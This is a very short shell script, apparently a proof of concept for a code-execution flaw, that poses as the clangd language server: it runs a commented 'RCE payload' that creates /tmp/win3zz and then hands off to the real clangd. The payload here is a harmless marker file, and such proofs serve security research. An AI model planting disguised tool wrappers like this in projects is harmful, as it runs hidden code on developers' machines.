#!/bin/sh

# Run RCE payload
/usr/bin/touch /tmp/win3zz

# Run real clangd
exec /usr/bin/clangd "$@"